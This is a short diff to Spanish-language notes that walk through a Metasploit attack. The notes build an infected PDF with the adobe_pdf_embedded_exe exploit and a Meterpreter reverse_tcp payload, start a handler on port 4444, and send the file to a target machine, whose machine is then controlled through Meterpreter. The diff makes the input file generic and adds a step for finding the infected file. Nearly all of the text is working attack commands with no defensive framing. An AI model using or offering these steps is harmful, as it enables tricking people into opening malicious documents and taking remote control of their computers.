@@ -12,7 +12,7 @@ use exploit/windows/fileformat/adobe_pdf_embedded_exe <br />
 set payload windows/meterpreter/reverse_tcp <br />
 set lhost <ip_maquina_local> <br />
 set lport 4444 <br />
-set infilename /root/parcial/el_gigante_egoista.pdf <br />
+set infilename /{path}/{nombre_pdf_a_infectar}.pdf <br />
 exploit <br />
 <br />
 back <br />
@@ -21,6 +21,7 @@ set lhost <ip_maquina_local> <br />
 set lport 4444 <br />
 exploit <br /> 
 <br />
+Ir a la carpeta donde se ha creado en archivo infectado <br />
 Enviar archivo a la máquina que se desea atacar <br />
 cuando se tenga el acceso a la máquina atacada se podrá usar todas las herramientas que tiene meterpreter<br />
 <br />
